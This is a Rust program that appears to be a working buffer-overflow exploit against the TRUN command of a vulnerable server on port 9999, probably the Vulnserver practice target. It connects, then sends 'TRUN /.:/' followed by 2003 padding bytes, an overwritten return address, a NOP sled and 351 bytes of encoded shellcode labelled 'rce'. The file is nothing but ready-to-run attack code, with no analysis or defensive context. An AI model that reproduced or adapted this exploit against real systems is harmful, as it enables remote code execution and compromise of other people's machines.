use std::io::prelude::*;
use std::net::TcpStream;
use std::time::Duration;
use std::io::Write;

fn main() {
    println!("Buffer, Check!");

    let mut connect = TcpStream::connect("192.168.18.48:9999").unwrap();
    println!("Connected to the server successfully");

    connect.set_read_timeout(Some(Duration::from_secs(2))).unwrap();

    let mut buffer = [0; 50];
    let size = connect.read(&mut buffer).unwrap();

    // Convert received bytes to a UTF-8 string
    let message = String::from_utf8_lossy(&buffer[..size]);
    println!("Server says: {}", message);

    let bytes = [b'A'; 2003];
    let tail = [0xaf, 0x11, 0x50, 0x62];
    let gap = [0x90; 32];
    let rce: [u8; 351] = [0xdb,0xd4,0xd9,0x74,0x24,0xf4,0xbe,0x1a,0x23,0x29,0x81,0x5f,0x33,0xc9,0xb1,0x52,0x31,0x77,0x17,0x03,0x77,0x17,0x83,0xdd,0x27,0xcb,0x74,0x1d,0xcf,0x89,0x77,0xdd,0x10,0xee,0xfe,0x38,0x21,0x2e,0x64,0x49,0x12,0x9e,0xee,0x1f,0x9f,0x55,0xa2,0x8b,0x14,0x1b,0x6b,0xbc,0x9d,0x96,0x4d,0xf3,0x1e,0x8a,0xae,0x92,0x9c,0xd1,0xe2,0x74,0x9c,0x19,0xf7,0x75,0xd9,0x44,0xfa,0x27,0xb2,0x03,0xa9,0xd7,0xb7,0x5e,0x72,0x5c,0x8b,0x4f,0xf2,0x81,0x5c,0x71,0xd3,0x14,0xd6,0x28,0xf3,0x97,0x3b,0x41,0xba,0x8f,0x58,0x6c,0x74,0x24,0xaa,0x1a,0x87,0xec,0xe2,0xe3,0x24,0xd1,0xca,0x11,0x34,0x16,0xec,0xc9,0x43,0x6e,0x0e,0x77,0x54,0xb5,0x6c,0xa3,0xd1,0x2d,0xd6,0x20,0x41,0x89,0xe6,0xe5,0x14,0x5a,0xe4,0x42,0x52,0x04,0xe9,0x55,0xb7,0x3f,0x15,0xdd,0x36,0xef,0x9f,0xa5,0x1c,0x2b,0xfb,0x7e,0x3c,0x6a,0xa1,0xd1,0x41,0x6c,0x0a,0x8d,0xe7,0xe7,0xa7,0xda,0x95,0xaa,0xaf,0x2f,0x94,0x54,0x30,0x38,0xaf,0x27,0x02,0xe7,0x1b,0xaf,0x2e,0x60,0x82,0x28,0x50,0x5b,0x72,0xa6,0xaf,0x64,0x83,0xef,0x6b,0x30,0xd3,0x87,0x5a,0x39,0xb8,0x57,0x62,0xec,0x6f,0x07,0xcc,0x5f,0xd0,0xf7,0xac,0x0f,0xb8,0x1d,0x23,0x6f,0xd8,0x1e,0xe9,0x18,0x73,0xe5,0x7a,0xe7,0x2c,0xf7,0x76,0x8f,0x2e,0xf7,0x97,0x13,0xa6,0x11,0xfd,0xbb,0xee,0x8a,0x6a,0x25,0xab,0x40,0x0a,0xaa,0x61,0x2d,0x0c,0x20,0x86,0xd2,0xc3,0xc1,0xe3,0xc0,0xb4,0x21,0xbe,0xba,0x13,0x3d,0x14,0xd2,0xf8,0xac,0xf3,0x22,0x76,0xcd,0xab,0x75,0xdf,0x23,0xa2,0x13,0xcd,0x1a,0x1c,0x01,0x0c,0xfa,0x67,0x81,0xcb,0x3f,0x69,0x08,0x99,0x04,0x4d,0x1a,0x67,0x84,0xc9,0x4e,0x37,0xd3,0x87,0x38,0xf1,0x8d,0x69,0x92,0xab,0x62,0x20,0x72,0x2d,0x49,0xf3,0x04,0x32,0x84,0x85,0xe8,0x83,0x71,0xd0,0x17,0x2b,0x16,0xd4,0x60,0x51,0x86,0x1b,0xbb,0xd1,0xb6,0x51,0xe1,0x70,0x5f,0x3c,0x70,0xc1,0x02,0xbf,0xaf,0x06,0x3b,0x3c,0x45,0xf7,0xb8,0x5c,0x2c,0xf2,0x85,0xda,0xdd,0x8e,0x96,0x8e,0xe1,0x3d,0x96,0x9a];
    
    //creates a new vector to store values.
    let mut payload: Vec<u8> = Vec::new();
    payload.extend(b"TRUN /.:/");
    payload.extend(&bytes);
    payload.extend(&tail);
    payload.extend(&gap);
    payload.extend(&rce);

    match connect.write_all(&payload) {
        Ok(_) => println!("Payload sent successfully"),
        Err(e) => println!("Error sending payload: {}", e),
    }

}

